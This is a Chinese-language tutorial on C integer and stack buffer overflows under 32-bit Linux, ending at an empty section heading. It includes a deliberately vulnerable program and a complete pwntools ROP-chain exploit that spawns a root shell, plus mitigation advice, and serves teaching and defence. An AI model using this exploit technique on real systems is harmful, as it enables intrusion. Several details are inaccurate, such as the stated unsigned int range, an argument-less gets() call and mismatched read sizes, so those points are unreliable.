# C语言与溢出

## 概述

1. 环境以及工具说明：
   - VMware® Workstation 15 Pro
   - Ubuntu-16.04.1
   - pwntools 3.13.0
   - IDA Pro 7.0
   - python 2.7
2. 综述
   本文主要是针对c语言的程序在Linux下运行时，由于人为的编写疏漏，造成的缓冲区溢出问题以及从c语言编程上的防范办法。从内容上讲分为两部分一是漏洞利用，二是防范方法。由于篇幅有限，本文仅对栈上的溢出做说明。
3. 标签
   C语言、Linux、python、二进制

## 从整型溢出看溢出

整型溢出在我们学习C/C++的时候就有提及，主要是不同类型的变量能够存储的数据长度不同导致的，比如 unsigned int 类型为 0~0xffff。这种类型的溢出往往能够通过特定的输入绕过一些判断，进而达到某些目的。

```c++
    // num_overflow.c
    // gcc num_overflow.c -o num_overflow
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main(void)
    {
        unsigned short a;
        printf("Please input your number: ");
        a = atoi(gets());
        if(a < 8){
            printf("\nYour number is OK!\n");
        }else{
            printf("\nYour number is too big\n");
        }
        return 0;
    }
```

运行结果：

```s
nop@nop-pwn:~/Desktop$ ./num_overflow
Please input your number: 1

Your number is OK!
nop@nop-pwn:~/Desktop$ ./num_overflow
Please input your number: 11

Your number is too big
nop@nop-pwn:~/Desktop$ ./num_overflow
Please input your number: 65536

Your number is OK!
```

从结果我们可以看到，当输入65536(0x10000)时程序也输出了我们期待的结果，即达到了绕过这个if判断语句的目的，实际程序中我们可以利用这一点来调用程序中本不该调用的函数或者利用程序中的输输入造成缓冲区溢出，进而控制程序执行流程。

至于导致这样结果的原因，我们可以先看一下程序对应的汇编代码(截取部分代码)：

```s
.text:0000000000400612                 call    _gets
.text:0000000000400617                 cdqe
.text:0000000000400619                 mov     rdi, rax        ; nptr
.text:000000000040061C                 call    _atoi
.text:0000000000400621                 mov     [rbp+var_2], ax
.text:0000000000400625                 cmp     [rbp+var_2], 7
.text:000000000040062A                 ja      short loc_400638
```

从汇编代码中我们可以看出，我们通过atoi得到数是存放在rax（函数返回值放到ax寄存器中），但是后面做判断时，却是用的是ax，这就意味着当我们的输入超过 0xffff时（如0x10001），ax中实际的值为0x0001，所以我们输入65536时，就自然的绕过了这个if判断。

缓冲区溢出和整型溢出类似，但不相同，二者同样是因为输出内容太大（太长）造成原变量不能储存这个过大的输入而造成的问题。对于缓存区溢出的问题大多是因为 `gets`、`scanf`这类输入函数没有对输入长度做限制，这就导致了我们可以输入任意长度的内容。

因为在linux中，程序的输入（通常情况下）、函数调用与结束等操作都是在栈上操作的，所以当我们的输入足够长，就可以覆盖栈上的数据，进而改变函数栈帧达到劫持程序执行流程的目的。

### 栈溢出攻击原理

在了解栈溢出攻击原理之前，我们先了解一下函数栈帧的创建与销毁

![Alt](img/栈溢出2.png)

实际上，程序在调用函数时，会先将函数的参数压栈（32位机器下，64位机器有所不同，详见下文），然后保存当前状态即EIP、EBP压栈，接着通过对ESP的操作开辟程序栈帧。之后函数的局部变量都在栈上操作。

汇编代码中这个个过程体现的很明显：

```c++
// 函数栈帧的创建与销毁
// func_frame.c
// gcc -m32 func_frame.c -o func_frame
void test(int a,int b,int c);
int main(void)
{
    test(1,2,3);
    return 0;
}
void test(int a,int b,int c)
{
    printf("first:%d\nsecond:%d\nthird:%d\n",a,b,c);
}
```

mian函数中调用test时：

```s
.text:0804841F                 push    3
.text:08048421                 push    2
.text:08048423                 push    1
.text:08048425                 call    test
```

通过汇编代码可以看到在调用函数前会将函数的参数压入栈中，接着调用test。进入到test函数：

```s
.text:0804843A                 push    ebp
.text:0804843B                 mov     ebp, esp
.text:0804843D                 sub     esp, 8 <-- 开辟栈帧
.text:08048440                 push    [ebp+arg_8]
.text:08048443                 push    [ebp+arg_4]
.text:08048446                 push    [ebp+arg_0]
.text:08048449                 push    offset format   ; "first:%d\nsecond:%d\nthird:%d\n"
.text:0804844E                 call    _printf
.text:08048453                 add     esp, 10h
.text:08048456                 nop
.text:08048457                 leave ; 相当于 mov esp,ebp; pop ebp
.text:08048458                 retn  ; 相当于 pop eip
```

进入函数后先将ebp压栈，然后开辟栈帧，给printf传入参数时直接通过ebp加偏移的方式获取之前押入到栈中的数据。函数执行完之后通过leave指令销毁函数栈帧，然后通过ret将栈中存储的EIP弹出到EIP继续执行main函数。

从函数栈帧的创建与销毁过程中我们可以看到，EIP在函数执行结束之后会被ret指令更改，这一指令相当于 `pop eip`即将当前栈顶的值赋值给eip，那么如果我们可以修改这个栈顶的值，就可以劫持程序流程到我们想要他执行的位置。之前我们提到过，变量的输入一般都在栈上，所以如果我们的输入没有限制，那么我们就可以通过输入覆盖到这个位置，进而达到攻击目的，即实现栈溢出攻击

## Linux下32位程序的缓冲区溢出攻击

### Linux下的保护机制

1. Canary（栈保护）
GCC在产生的代码中加入 stack protector 机制，其思想就是在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的 canary 值，每次函数返回之前，都会检查这个值是否被改变，进而检查程序是否被改变，防止缓冲区溢出的攻击

2. NX/DEP（堆栈不可执行）
NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。

3. PIE/ASLR（地址随机化）
其思想是是栈的位置在程序每次运行时都发生变化，这样就可以避免攻击者向某个位置插入一个指针进行的一系列攻击

4. Fortify
gcc新的为了增强保护的一种机制，防止缓冲区溢出攻击。

### 不开启canary的情况

```c++
// stack_overflow.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function(){
    char buf[128];
    read(STDIN_FILENO,buf,0x110);
}
int main(int argc,char** argv){
    vulnerable_function();
}
}
```

从源代码可见，程序存在明显的溢出漏洞，我们在不开启canary的情况下静态编译程序：

> gcc -fno-stack-protector -m32 -static -o stack_overflow stack_overflow.c

#### 攻击-no canary

首先为利用漏洞寻找相关信息（偏移）

查看对应的汇编代码：

```s
.text:0804840B                 push    ebp
.text:0804840C                 mov     ebp, esp
.text:0804840E                 sub     esp, 88h
.text:08048414                 sub     esp, 4
.text:08048417                 push    100h            ; nbytes
.text:0804841C                 lea     eax, [ebp+buf]
.text:08048422                 push    eax             ; buf
.text:08048423                 push    0               ; fd
.text:08048425                 call    _read
.text:0804842A                 add     esp, 10h
.text:0804842D                 nop
.text:0804842E                 leave
.text:0804842F                 retn
```

不难发现，我们的输入位于 $rbp - 0x88, 而我们的EIP位于 $rbp + 0x4, 所以我们需要填充到eip的字符个数为 0x88 + 0x4(这一过程调试时可以更明显的看到，但是由于篇幅限制，这里不给出调试示例)

漏洞利用：

```python
from pwn import *
from struct import pack
context.arch='i386'

p = ''
p += pack('<I', 0x0806ec4a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b7f96) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0805467b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ec4a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b7f96) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0805467b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ec4a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049443) # xor eax, eax ; ret
p += pack('<I', 0x0805467b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de66d) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806ec4a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049443) # xor eax, eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0807a62f) # inc eax ; ret
p += pack('<I', 0x0806c8c5) # int 0x80

payload = 'A'*(0x88+0x4) + p
p = process('./stack_overflow')
p.send(payload)
sleep(0.1)
p.interactive()
```

运行结果：

```s
root@nop-pwn:~/Desktop# python exp.py
[+] Starting local process './stack_overflow': pid 3250
[*] Switching to interactive mode
$ whoami
root
$  
```

#### 防范-不开启cananry

最直接的办法就是限制输入长度，即让程序没法产生溢出，此外采取动态编译的形式即程序运行时使用动态链接库的方式运行，这样可以避免直接通过程序来生成 rpochain 的情况。

限制输入长度不是每次都能考虑周到，在不限制程序输入长度的情况下同样可以通过开启canary保护的措施来在一定程度上避免缓冲区溢出的攻击。

#### 保护全开的情况
